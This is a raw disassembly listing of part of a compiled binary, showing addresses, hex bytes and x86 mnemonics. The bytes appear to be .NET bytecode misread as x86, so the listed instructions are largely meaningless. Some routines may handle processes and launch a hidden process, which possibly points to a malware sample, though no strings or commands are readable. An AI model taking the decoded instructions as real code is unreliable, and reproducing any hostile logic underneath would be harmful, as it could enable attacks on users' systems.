  4040eb:	ff 00                	incl   (%eax)
  4040ed:	00 6a 30             	add    %ch,0x30(%edx)
  4040f0:	1b 02                	sbb    (%edx),%eax
  4040f2:	20 cd                	and    %cl,%ch
  4040f4:	00 00                	add    %al,(%eax)
  4040f6:	00 6f 62             	add    %ch,0x62(%edi)
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	0a 02                	or     (%edx),%al
  4040fd:	03 68 28             	add    0x28(%eax),%ebp
  404100:	29 00                	sub    %eax,(%eax)
  404102:	00 06                	add    %al,(%esi)
  404104:	16                   	push   %ss
  404105:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  404108:	00 00                	add    %al,(%eax)
  40410a:	0a 2a                	or     (%edx),%ch
  40410c:	03 15 6e 30 1b 02    	add    0x21b306e,%edx
  404112:	20 ce                	and    %cl,%dh
  404114:	00 00                	add    %al,(%eax)
  404116:	00 6f 62             	add    %ch,0x62(%edi)
  404119:	00 00                	add    %al,(%eax)
  40411b:	0a 02                	or     (%edx),%al
  40411d:	03 69 28             	add    0x28(%ecx),%ebp
  404120:	28 00                	sub    %al,(%eax)
  404122:	00 06                	add    %al,(%esi)
  404124:	16                   	push   %ss
  404125:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404128:	00 00                	add    %al,(%eax)
  40412a:	0a 2a                	or     (%edx),%ch
  40412c:	02 20                	add    (%eax),%ah
  40412e:	d3 00                	roll   %cl,(%eax)
  404130:	00 00                	add    %al,(%eax)
  404132:	6f                   	outsl  %ds:(%esi),(%dx)
  404133:	62 00                	bound  %eax,(%eax)
  404135:	00 0a                	add    %cl,(%edx)
  404137:	02 03                	add    (%ebx),%al
  404139:	28 27                	sub    %ah,(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	06                   	push   %es
  40413e:	16                   	push   %ss
  40413f:	1e                   	push   %ds
  404140:	6f                   	outsl  %ds:(%esi),(%dx)
  404141:	4c                   	dec    %esp
  404142:	00 00                	add    %al,(%eax)
  404144:	0a 2a                	or     (%edx),%ch
  404146:	03 20                	add    (%eax),%esp
  404148:	00 00                	add    %al,(%eax)
  40414a:	00 80 6a 30 1a 02    	add    %al,0x21a306a(%eax)
  404150:	20 d3                	and    %dl,%bl
  404152:	00 00                	add    %al,(%eax)
  404154:	00 6f 62             	add    %ch,0x62(%edi)
  404157:	00 00                	add    %al,(%eax)
  404159:	0a 02                	or     (%edx),%al
  40415b:	03 28                	add    (%eax),%ebp
  40415d:	27                   	daa
  40415e:	00 00                	add    %al,(%eax)
  404160:	06                   	push   %es
  404161:	16                   	push   %ss
  404162:	1e                   	push   %ds
  404163:	6f                   	outsl  %ds:(%esi),(%dx)
  404164:	4c                   	dec    %esp
  404165:	00 00                	add    %al,(%eax)
  404167:	0a 2a                	or     (%edx),%ch
  404169:	03 20                	add    (%eax),%esp
  40416b:	00 80 ff ff 6a 30    	add    %al,0x306affff(%eax)
  404171:	1b 02                	sbb    (%edx),%eax
  404173:	20 d2                	and    %dl,%dl
  404175:	00 00                	add    %al,(%eax)
  404177:	00 6f 62             	add    %ch,0x62(%edi)
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 02                	or     (%edx),%al
  40417e:	03 69 28             	add    0x28(%ecx),%ebp
  404181:	28 00                	sub    %al,(%eax)
  404183:	00 06                	add    %al,(%esi)
  404185:	16                   	push   %ss
  404186:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404189:	00 00                	add    %al,(%eax)
  40418b:	0a 2a                	or     (%edx),%ch
  40418d:	03 1f                	add    (%edi),%ebx
  40418f:	80 6a 30 1b          	subb   $0x1b,0x30(%edx)
  404193:	02 20                	add    (%eax),%ah
  404195:	d1 00                	roll   $1,(%eax)
  404197:	00 00                	add    %al,(%eax)
  404199:	6f                   	outsl  %ds:(%esi),(%dx)
  40419a:	62 00                	bound  %eax,(%eax)
  40419c:	00 0a                	add    %cl,(%edx)
  40419e:	02 03                	add    (%ebx),%al
  4041a0:	68 28 29 00 00       	push   $0x2928
  4041a5:	06                   	push   %es
  4041a6:	16                   	push   %ss
  4041a7:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	0a 2a                	or     (%edx),%ch
  4041ae:	03 1f                	add    (%edi),%ebx
  4041b0:	e0 6a                	loopne 0x40421c
  4041b2:	30 14 02             	xor    %dl,(%edx,%eax,1)
  4041b5:	20 d0                	and    %dl,%al
  4041b7:	00 00                	add    %al,(%eax)
  4041b9:	00 6f 62             	add    %ch,0x62(%edi)
  4041bc:	00 00                	add    %al,(%eax)
  4041be:	0a 02                	or     (%edx),%al
  4041c0:	03 d2                	add    %edx,%edx
  4041c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c3:	62 00                	bound  %eax,(%eax)
  4041c5:	00 0a                	add    %cl,(%edx)
  4041c7:	2a 02                	sub    (%edx),%al
  4041c9:	03 d2                	add    %edx,%edx
  4041cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041cc:	62 00                	bound  %eax,(%eax)
  4041ce:	00 0a                	add    %cl,(%edx)
  4041d0:	2a 00                	sub    (%eax),%al
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	1b 30                	sbb    (%eax),%esi
  4041d6:	06                   	push   %es
  4041d7:	00 b9 02 00 00 17    	add    %bh,0x17000002(%ecx)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	11 7e 05             	adc    %edi,0x5(%esi)
  4041e2:	00 00                	add    %al,(%eax)
  4041e4:	04 28                	add    $0x28,%al
  4041e6:	85 00                	test   %eax,(%eax)
  4041e8:	00 0a                	add    %cl,(%edx)
  4041ea:	7e 06                	jle    0x4041f2
  4041ec:	00 00                	add    %al,(%eax)
  4041ee:	04 28                	add    $0x28,%al
  4041f0:	86 00                	xchg   %al,(%eax)
  4041f2:	00 0a                	add    %cl,(%edx)
  4041f4:	73 87                	jae    0x40417d
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	0a 0a                	or     (%edx),%cl
  4041fa:	28 88 00 00 0a 6f    	sub    %cl,0x6f0a0000(%eax)
  404200:	89 00                	mov    %eax,(%eax)
  404202:	00 0a                	add    %cl,(%edx)
  404204:	6f                   	outsl  %ds:(%esi),(%dx)
  404205:	8a 00                	mov    (%eax),%al
  404207:	00 0a                	add    %cl,(%edx)
  404209:	06                   	push   %es
  40420a:	6f                   	outsl  %ds:(%esi),(%dx)
  40420b:	8b 00                	mov    (%eax),%eax
  40420d:	00 0a                	add    %cl,(%edx)
  40420f:	28 8c 00 00 0a 39 7a 	sub    %cl,0x7a390a00(%eax,%eax,1)
  404216:	02 00                	add    (%eax),%al
  404218:	00 16                	add    %dl,(%esi)
  40421a:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40421d:	10 20                	adc    %ah,(%eax)
  40421f:	e8 03 00 00 28       	call   0x28404227
  404224:	14 00                	adc    $0x0,%al
  404226:	00 0a                	add    %cl,(%edx)
  404228:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40422b:	58                   	pop    %eax
  40422c:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40422f:	04 1f                	add    $0x1f,%al
  404231:	0a 32                	or     (%edx),%dh
  404233:	ea 28 8d 00 00 0a 13 	ljmp   $0x130a,$0x8d28
  40423a:	05 16 13 06 2b       	add    $0x2b061316,%eax
  40423f:	32 11                	xor    (%ecx),%dl
  404241:	05 11 06 9a 13       	add    $0x139a0611,%eax
  404246:	07                   	pop    %es
  404247:	11 07                	adc    %eax,(%edi)
  404249:	6f                   	outsl  %ds:(%esi),(%dx)
  40424a:	89 00                	mov    %eax,(%eax)
  40424c:	00 0a                	add    %cl,(%edx)
  40424e:	6f                   	outsl  %ds:(%esi),(%dx)
  40424f:	8a 00                	mov    (%eax),%al
  404251:	00 0a                	add    %cl,(%edx)
  404253:	06                   	push   %es
  404254:	6f                   	outsl  %ds:(%esi),(%dx)
  404255:	8b 00                	mov    (%eax),%eax
  404257:	00 0a                	add    %cl,(%edx)
  404259:	28 27                	sub    %ah,(%edi)
  40425b:	00 00                	add    %al,(%eax)
  40425d:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404260:	11 07                	adc    %eax,(%edi)
  404262:	6f                   	outsl  %ds:(%esi),(%dx)
  404263:	8e 00                	mov    (%eax),%es
  404265:	00 0a                	add    %cl,(%edx)
  404267:	de 03                	fiadds (%ebx)
  404269:	26 de 00             	fiadds %es:(%eax)
  40426c:	11 06                	adc    %eax,(%esi)
  40426e:	17                   	pop    %ss
  40426f:	58                   	pop    %eax
  404270:	13 06                	adc    (%esi),%eax
  404272:	11 06                	adc    %eax,(%esi)
  404274:	11 05 8e 69 32 c6    	adc    %eax,0xc632698e
  40427a:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404280:	7e 73                	jle    0x4042f5
  404282:	8f 00                	pop    (%eax)
  404284:	00 0a                	add    %cl,(%edx)
  404286:	13 08                	adc    (%eax),%ecx
  404288:	11 08                	adc    %ecx,(%eax)
  40428a:	73 90                	jae    0x40421c
  40428c:	00 00                	add    %al,(%eax)
  40428e:	0a 13                	or     (%ebx),%dl
  404290:	09 11                	or     %edx,(%ecx)
  404292:	09 72 4d             	or     %esi,0x4d(%edx)
  404295:	21 00                	and    %eax,(%eax)
  404297:	70 6f                	jo     0x404308
  404299:	91                   	xchg   %eax,%ecx
  40429a:	00 00                	add    %al,(%eax)
  40429c:	0a 11                	or     (%ecx),%dl
  40429e:	09 1b                	or     %ebx,(%ebx)
  4042a0:	8d 39                	lea    (%ecx),%edi
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	01 25 16 72 67 21    	add    %esp,0x21677216
  4042aa:	00 70 a2             	add    %dh,-0x5e(%eax)
  4042ad:	25 17 06 6f 8b       	and    $0x8b6f0617,%eax
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	0a 28                	or     (%eax),%ch
  4042b6:	92                   	xchg   %eax,%edx
  4042b7:	00 00                	add    %al,(%eax)
  4042b9:	0a a2 25 18 72 bb    	or     -0x448de7db(%edx),%ah
  4042bf:	21 00                	and    %eax,(%eax)
  4042c1:	70 a2                	jo     0x404265
  4042c3:	25 19 06 6f 8b       	and    $0x8b6f0619,%eax
  4042c8:	00 00                	add    %al,(%eax)
  4042ca:	0a a2 25 1a 72 cf    	or     -0x308de5db(%edx),%ah
  4042d0:	21 00                	and    %eax,(%eax)
  4042d2:	70 a2                	jo     0x404276
  4042d4:	28 93 00 00 0a 6f    	sub    %dl,0x6f0a0000(%ebx)
  4042da:	94                   	xchg   %eax,%esp
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	0a 11                	or     (%ecx),%dl
  4042df:	09 17                	or     %edx,(%edi)
  4042e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4042e2:	95                   	xchg   %eax,%ebp
  4042e3:	00 00                	add    %al,(%eax)
  4042e5:	0a 11                	or     (%ecx),%dl
  4042e7:	09 17                	or     %edx,(%edi)
  4042e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ea:	96                   	xchg   %eax,%esi
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 11                	or     (%ecx),%dl
  4042ef:	09 6f 97             	or     %ebp,-0x69(%edi)
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 11                	or     (%ecx),%dl
  4042f6:	08 6f 98             	or     %ch,-0x68(%edi)
  4042f9:	00 00                	add    %al,(%eax)
  4042fb:	0a 26                	or     (%esi),%ah
  4042fd:	2b 4c 7e 99          	sub    -0x67(%esi,%edi,2),%ecx
  404301:	00 00                	add    %al,(%eax)
  404303:	0a 72 d5             	or     -0x2b(%edx),%dh
  404306:	21 00                	and    %eax,(%eax)
  404308:	70 28                	jo     0x404332
  40430a:	9a 00 00 0a 18 6f 9b 	lcall  $0x9b6f,$0x180a0000
  404311:	00 00                	add    %al,(%eax)
  404313:	0a 13                	or     (%ebx),%dl
  404315:	0a 11                	or     (%ecx),%dl
  404317:	0a 06                	or     (%esi),%al
  404319:	6f                   	outsl  %ds:(%esi),(%dx)
  40431a:	8b 00                	mov    (%eax),%eax
  40431c:	00 0a                	add    %cl,(%edx)
  40431e:	28 92 00 00 0a 72    	sub    %dl,0x720a0000(%edx)
  404324:	33 22                	xor    (%edx),%esp
  404326:	00 70 06             	add    %dh,0x6(%eax)
  404329:	6f                   	outsl  %ds:(%esi),(%dx)
  40432a:	8b 00                	mov    (%eax),%eax
  40432c:	00 0a                	add    %cl,(%edx)
  40432e:	72 33                	jb     0x404363
  404330:	22 00                	and    (%eax),%al
  404332:	70 28                	jo     0x40435c
  404334:	9c                   	pushf
  404335:	00 00                	add    %al,(%eax)
  404337:	0a 6f 9d             	or     -0x63(%edi),%ch
  40433a:	00 00                	add    %al,(%eax)
  40433c:	0a de                	or     %dh,%bl
  40433e:	0c 11                	or     $0x11,%al
  404340:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404343:	11 0a                	adc    %ecx,(%edx)
  404345:	6f                   	outsl  %ds:(%esi),(%dx)
  404346:	33 00                	xor    (%eax),%eax
  404348:	00 0a                	add    %cl,(%edx)
  40434a:	dc 06                	faddl  (%esi)
  40434c:	6f                   	outsl  %ds:(%esi),(%dx)
  40434d:	8b 00                	mov    (%eax),%eax
  40434f:	00 0a                	add    %cl,(%edx)
  404351:	28 73 00             	sub    %dh,0x0(%ebx)
  404354:	00 0a                	add    %cl,(%edx)
  404356:	2c 15                	sub    $0x15,%al
  404358:	06                   	push   %es
  404359:	6f                   	outsl  %ds:(%esi),(%dx)
  40435a:	8b 00                	mov    (%eax),%eax
  40435c:	00 0a                	add    %cl,(%edx)
  40435e:	28 9e 00 00 0a 20    	sub    %bl,0x200a0000(%esi)
  404364:	e8 03 00 00 28       	call   0x2840436c
  404369:	14 00                	adc    $0x0,%al
  40436b:	00 0a                	add    %cl,(%edx)
  40436d:	06                   	push   %es
  40436e:	6f                   	outsl  %ds:(%esi),(%dx)
  40436f:	8b 00                	mov    (%eax),%eax
  404371:	00 0a                	add    %cl,(%edx)
  404373:	17                   	pop    %ss
  404374:	73 77                	jae    0x4043ed
  404376:	00 00                	add    %al,(%eax)
  404378:	0a 28                	or     (%eax),%ch
  40437a:	88 00                	mov    %al,(%eax)
  40437c:	00 0a                	add    %cl,(%edx)
  40437e:	6f                   	outsl  %ds:(%esi),(%dx)
  40437f:	89 00                	mov    %eax,(%eax)
  404381:	00 0a                	add    %cl,(%edx)
  404383:	6f                   	outsl  %ds:(%esi),(%dx)
  404384:	8a 00                	mov    (%eax),%al
  404386:	00 0a                	add    %cl,(%edx)
  404388:	28 9f 00 00 0a 0b    	sub    %bl,0xb0a0000(%edi)
  40438e:	25 07 16 07 8e       	and    $0x8e071607,%eax
  404393:	69 6f 4c 00 00 0a 73 	imul   $0x730a0000,0x4c(%edi),%ebp
  40439a:	18 00                	sbb    %al,(%eax)
  40439c:	00 0a                	add    %cl,(%edx)
  40439e:	20 00                	and    %al,(%eax)
  4043a0:	00 71 02             	add    %dh,0x2(%ecx)
  4043a3:	20 00                	and    %al,(%eax)
  4043a5:	40                   	inc    %eax
  4043a6:	0d 03 6f 19 00       	or     $0x196f03,%eax
  4043ab:	00 0a                	add    %cl,(%edx)
  4043ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4043b1:	01 0c 73             	add    %ecx,(%ebx,%esi,2)
  4043b4:	18 00                	sbb    %al,(%eax)
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	08 6f a0             	or     %ch,-0x60(%edi)
  4043bb:	00 00                	add    %al,(%eax)
  4043bd:	0a 25 08 16 08 8e    	or     0x8e081608,%ah
  4043c3:	69 6f 4c 00 00 0a 6f 	imul   $0x6f0a0000,0x4c(%edi),%ebp
  4043ca:	41                   	inc    %ecx
  4043cb:	00 00                	add    %al,(%eax)
  4043cd:	0a 28                	or     (%eax),%ch
  4043cf:	82 00 00             	addb   $0x0,(%eax)
  4043d2:	06                   	push   %es
  4043d3:	28 a1 00 00 0a 72    	sub    %ah,0x720a0000(%ecx)
  4043d9:	37                   	aaa
  4043da:	22 00                	and    (%eax),%al
  4043dc:	70 28                	jo     0x404406
  4043de:	51                   	push   %ecx
  4043df:	00 00                	add    %al,(%eax)
  4043e1:	0a 0d 09 73 a2 00    	or     0xa27309,%cl
  4043e7:	00 0a                	add    %cl,(%edx)
  4043e9:	13 0b                	adc    (%ebx),%ecx
  4043eb:	11 0b                	adc    %ecx,(%ebx)
  4043ed:	72 41                	jb     0x404430
  4043ef:	22 00                	and    (%eax),%al
  4043f1:	70 6f                	jo     0x404462
  4043f3:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  4043f8:	0b 72 55             	or     0x55(%edx),%esi
  4043fb:	22 00                	and    (%eax),%al
  4043fd:	70 6f                	jo     0x40446e
  4043ff:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  404404:	0b 72 75             	or     0x75(%edx),%esi
  404407:	22 00                	and    (%eax),%al
  404409:	70 06                	jo     0x404411
  40440b:	6f                   	outsl  %ds:(%esi),(%dx)
  40440c:	8b 00                	mov    (%eax),%eax
  40440e:	00 0a                	add    %cl,(%edx)
  404410:	72 33                	jb     0x404445
  404412:	22 00                	and    (%eax),%al
  404414:	70 28                	jo     0x40443e
  404416:	9c                   	pushf
  404417:	00 00                	add    %al,(%eax)
  404419:	0a 6f a3             	or     -0x5d(%edi),%ch
  40441c:	00 00                	add    %al,(%eax)
  40441e:	0a 11                	or     (%ecx),%dl
  404420:	0b 72 8b             	or     -0x75(%edx),%esi
  404423:	22 00                	and    (%eax),%al
  404425:	70 28                	jo     0x40444f
  404427:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404428:	00 00                	add    %al,(%eax)
  40442a:	0a 28                	or     (%eax),%ch
  40442c:	51                   	push   %ecx
  40442d:	00 00                	add    %al,(%eax)
  40442f:	0a 6f a3             	or     -0x5d(%edi),%ch
  404432:	00 00                	add    %al,(%eax)
  404434:	0a 11                	or     (%ecx),%dl
  404436:	0b 72 93             	or     -0x6d(%edx),%esi
  404439:	22 00                	and    (%eax),%al
  40443b:	70 09                	jo     0x404446
  40443d:	28 a5 00 00 0a 72    	sub    %ah,0x720a0000(%ebp)
  404443:	9f                   	lahf
  404444:	22 00                	and    (%eax),%al
  404446:	70 28                	jo     0x404470
  404448:	9c                   	pushf
  404449:	00 00                	add    %al,(%eax)
  40444b:	0a 6f a3             	or     -0x5d(%edi),%ch
  40444e:	00 00                	add    %al,(%eax)
  404450:	0a de                	or     %dh,%bl
  404452:	0c 11                	or     $0x11,%al
  404454:	0b 2c 07             	or     (%edi,%eax,1),%ebp
  404457:	11 0b                	adc    %ecx,(%ebx)
  404459:	6f                   	outsl  %ds:(%esi),(%dx)
  40445a:	33 00                	xor    (%eax),%eax
  40445c:	00 0a                	add    %cl,(%edx)
  40445e:	dc 73 90             	fdivl  -0x70(%ebx)
  404461:	00 00                	add    %al,(%eax)
  404463:	0a 25 09 6f 91 00    	or     0x916f09,%ah
  404469:	00 0a                	add    %cl,(%edx)
  40446b:	25 17 6f 96 00       	and    $0x966f17,%eax
  404470:	00 0a                	add    %cl,(%edx)
  404472:	25 16 6f a6 00       	and    $0xa66f16,%eax
  404477:	00 0a                	add    %cl,(%edx)
  404479:	25 16 6f a7 00       	and    $0xa76f16,%eax
  40447e:	00 0a                	add    %cl,(%edx)
  404480:	25 17 6f 95 00       	and    $0x956f17,%eax
  404485:	00 0a                	add    %cl,(%edx)
  404487:	28 a8 00 00 0a 26    	sub    %ch,0x260a0000(%eax)
  40448d:	16                   	push   %ss
  40448e:	28 16                	sub    %dl,(%esi)
  404490:	00 00                	add    %al,(%eax)
  404492:	0a de                	or     %dh,%bl
  404494:	03 26                	add    (%esi),%esp
  404496:	de 00                	fiadds (%eax)
  404498:	2a 00                	sub    (%eax),%al
  40449a:	00 00                	add    %al,(%eax)
  40449c:	41                   	inc    %ecx
  40449d:	64 00 00             	add    %al,%fs:(%eax)
  4044a0:	00 00                	add    %al,(%eax)
  4044a2:	00 00                	add    %al,(%eax)
  4044a4:	67 00 00             	add    %al,(%bx,%si)
  4044a7:	00 22                	add    %ah,(%edx)
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 89 00 00 00 03    	add    %cl,0x3000000(%ecx)
  4044b1:	00 00                	add    %al,(%eax)
  4044b3:	00 01                	add    %al,(%ecx)
  4044b5:	00 00                	add    %al,(%eax)
  4044b7:	01 02                	add    %eax,(%edx)
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	00 36                	add    %dh,(%esi)
  4044bd:	01 00                	add    %eax,(%eax)
  4044bf:	00 29                	add    %ch,(%ecx)
  4044c1:	00 00                	add    %al,(%eax)
  4044c3:	00 5f 01             	add    %bl,0x1(%edi)
  4044c6:	00 00                	add    %al,(%eax)
  4044c8:	0c 00                	or     $0x0,%al
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	00 00                	add    %al,(%eax)
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	02 00                	add    (%eax),%al
  4044d2:	00 00                	add    %al,(%eax)
  4044d4:	0b 02                	or     (%edx),%eax
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	68 00 00 00 73       	push   $0x73000000
  4044dd:	02 00                	add    (%eax),%al
  4044df:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	b5 02                	mov    $0x2,%ch
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	b5 02                	mov    $0x2,%ch
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	03 00                	add    (%eax),%eax
  4044fa:	00 00                	add    %al,(%eax)
  4044fc:	32 00                	xor    (%eax),%al
  4044fe:	00 01                	add    %al,(%ecx)
  404500:	1b 30                	sbb    (%eax),%esi
  404502:	02 00                	add    (%eax),%al
  404504:	2e 00 00             	add    %al,%cs:(%eax)
  404507:	00 18                	add    %bl,(%eax)
  404509:	00 00                	add    %al,(%eax)
  40450b:	11 21                	adc    %esp,(%ecx)
  40450d:	00 22                	add    %ah,(%edx)
  40450f:	e2 33                	loop   0x404544
  404511:	0e                   	push   %cs
  404512:	00 00                	add    %al,(%eax)
  404514:	00 0a                	add    %cl,(%edx)
  404516:	28 aa 00 00 0a 28    	sub    %ch,0x280a0000(%edx)
  40451c:	ab                   	stos   %eax,%es:(%edi)
  40451d:	00 00                	add    %al,(%eax)
  40451f:	0a 73 ac             	or     -0x54(%ebx),%dh
  404522:	00 00                	add    %al,(%eax)
  404524:	0a 28                	or     (%eax),%ch
  404526:	ad                   	lods   %ds:(%esi),%eax
  404527:	00 00                	add    %al,(%eax)
  404529:	0a 06                	or     (%esi),%al
  40452b:	30 04 17             	xor    %al,(%edi,%edx,1)
  40452e:	0b de                	or     %esi,%ebx
  404530:	07                   	pop    %es
  404531:	de 03                	fiadds (%ebx)
  404533:	26 de 00             	fiadds %es:(%eax)
  404536:	16                   	push   %ss
  404537:	2a 07                	sub    (%edi),%al
  404539:	2a 00                	sub    (%eax),%al
  40453b:	00 01                	add    %al,(%ecx)
  40453d:	10 00                	adc    %al,(%eax)
  40453f:	00 00                	add    %al,(%eax)
  404541:	00 00                	add    %al,(%eax)
  404543:	00 27                	add    %ah,(%edi)
  404545:	27                   	daa
  404546:	00 03                	add    %al,(%ebx)
  404548:	01 00                	add    %eax,(%eax)
  40454a:	00 01                	add    %al,(%ecx)
  40454c:	1b 30                	sbb    (%eax),%esi
  40454e:	02 00                	add    (%eax),%al
  404550:	28 00                	sub    %al,(%eax)
  404552:	00 00                	add    %al,(%eax)
  404554:	02 00                	add    (%eax),%al
  404556:	00 11                	add    %dl,(%ecx)
  404558:	73 ae                	jae    0x404508
  40455a:	00 00                	add    %al,(%eax)
  40455c:	0a 28                	or     (%eax),%ch
  40455e:	af                   	scas   %es:(%edi),%eax
  40455f:	00 00                	add    %al,(%eax)
  404561:	0a 6f 5b             	or     0x5b(%edi),%ch
  404564:	00 00                	add    %al,(%eax)
  404566:	0a 72 af             	or     -0x51(%edx),%dh
  404569:	22 00                	and    (%eax),%al
  40456b:	70 6f                	jo     0x4045dc
  40456d:	b0 00                	mov    $0x0,%al
  40456f:	00 0a                	add    %cl,(%edx)
  404571:	2c 04                	sub    $0x4,%al
  404573:	17                   	pop    %ss
  404574:	0a de                	or     %dh,%bl
  404576:	07                   	pop    %es
  404577:	de 03                	fiadds (%ebx)
  404579:	26 de 00             	fiadds %es:(%eax)
  40457c:	16                   	push   %ss
  40457d:	2a 06                	sub    (%esi),%al
  40457f:	2a 01                	sub    (%ecx),%al
  404581:	10 00                	adc    %al,(%eax)
  404583:	00 00                	add    %al,(%eax)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 21                	add    %ah,(%ecx)
  404589:	21 00                	and    %eax,(%eax)
  40458b:	03 01                	add    (%ecx),%eax
  40458d:	00 00                	add    %al,(%eax)
  40458f:	01 1b                	add    %ebx,(%ebx)
  404591:	30 02                	xor    %al,(%edx)
  404593:	00 d0                	add    %dl,%al
  404595:	00 00                	add    %al,(%eax)
  404597:	00 19                	add    %bl,(%ecx)
  404599:	00 00                	add    %al,(%eax)
  40459b:	11 72 b5             	adc    %esi,-0x4b(%edx)
  40459e:	22 00                	and    (%eax),%al
  4045a0:	70 73                	jo     0x404615
  4045a2:	b1 00                	mov    $0x0,%cl
  4045a4:	00 0a                	add    %cl,(%edx)
  4045a6:	0a 06                	or     (%esi),%al
  4045a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a9:	b2 00                	mov    $0x0,%dl
  4045ab:	00 0a                	add    %cl,(%edx)
  4045ad:	0b 07                	or     (%edi),%eax
  4045af:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b0:	b3 00                	mov    $0x0,%bl
  4045b2:	00 0a                	add    %cl,(%edx)
  4045b4:	0c 2b                	or     $0x2b,%al
  4045b6:	7c 08                	jl     0x4045c0
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	b4 00                	mov    $0x0,%ah
  4045bb:	00 0a                	add    %cl,(%edx)
  4045bd:	0d 09 72 fb 22       	or     $0x22fb7209,%eax
  4045c2:	00 70 6f             	add    %dh,0x6f(%eax)
  4045c5:	b5 00                	mov    $0x0,%ch
  4045c7:	00 0a                	add    %cl,(%edx)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4045cf:	5b                   	pop    %ebx
  4045d0:	00 00                	add    %al,(%eax)
  4045d2:	0a 13                	or     (%ebx),%dl
  4045d4:	04 11                	add    $0x11,%al
  4045d6:	04 72                	add    $0x72,%al
  4045d8:	15 23 00 70 28       	adc    $0x28700023,%eax
  4045dd:	27                   	daa
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  4045e3:	09 72 41             	or     %esi,0x41(%edx)
  4045e6:	23 00                	and    (%eax),%eax
  4045e8:	70 6f                	jo     0x404659
  4045ea:	b5 00                	mov    $0x0,%ch
  4045ec:	00 0a                	add    %cl,(%edx)
  4045ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ef:	38 00                	cmp    %al,(%eax)
  4045f1:	00 0a                	add    %cl,(%edx)
  4045f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f4:	b6 00                	mov    $0x0,%dh
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	72 4d                	jb     0x404647
  4045fa:	23 00                	and    (%eax),%eax
  4045fc:	70 6f                	jo     0x40466d
  4045fe:	b0 00                	mov    $0x0,%al
  404600:	00 0a                	add    %cl,(%edx)
  404602:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  404607:	5d                   	pop    %ebp
  404608:	23 00                	and    (%eax),%eax
  40460a:	70 6f                	jo     0x40467b
  40460c:	b0 00                	mov    $0x0,%al
  40460e:	00 0a                	add    %cl,(%edx)
  404610:	2d 1c 09 72 41       	sub    $0x4172091c,%eax
  404615:	23 00                	and    (%eax),%eax
  404617:	70 6f                	jo     0x404688
  404619:	b5 00                	mov    $0x0,%ch
  40461b:	00 0a                	add    %cl,(%edx)
  40461d:	6f                   	outsl  %ds:(%esi),(%dx)
  40461e:	38 00                	cmp    %al,(%eax)
  404620:	00 0a                	add    %cl,(%edx)
  404622:	72 6b                	jb     0x40468f
  404624:	23 00                	and    (%eax),%eax
  404626:	70 28                	jo     0x404650
  404628:	27                   	daa
  404629:	00 00                	add    %al,(%eax)
  40462b:	0a 2c 05 17 13 05 de 	or     -0x21faece9(,%eax,1),%ch
  404632:	36 08 6f b7          	or     %ch,%ss:-0x49(%edi)
  404636:	00 00                	add    %al,(%eax)
  404638:	0a 3a                	or     (%edx),%bh
  40463a:	79 ff                	jns    0x40463b
  40463c:	ff                   	(bad)
  40463d:	ff                   	lcall  (bad)
  40463e:	de 0a                	fimuls (%edx)
  404640:	08 2c 06             	or     %ch,(%esi,%eax,1)
  404643:	08 6f 33             	or     %ch,0x33(%edi)
  404646:	00 00                	add    %al,(%eax)
  404648:	0a dc                	or     %ah,%bl
  40464a:	de 0a                	fimuls (%edx)
  40464c:	07                   	pop    %es
  40464d:	2c 06                	sub    $0x6,%al
  40464f:	07                   	pop    %es
  404650:	6f                   	outsl  %ds:(%esi),(%dx)
  404651:	33 00                	xor    (%eax),%eax
  404653:	00 0a                	add    %cl,(%edx)
  404655:	dc de                	(bad)
  404657:	0a 06                	or     (%esi),%al
  404659:	2c 06                	sub    $0x6,%al
  40465b:	06                   	push   %es
  40465c:	6f                   	outsl  %ds:(%esi),(%dx)
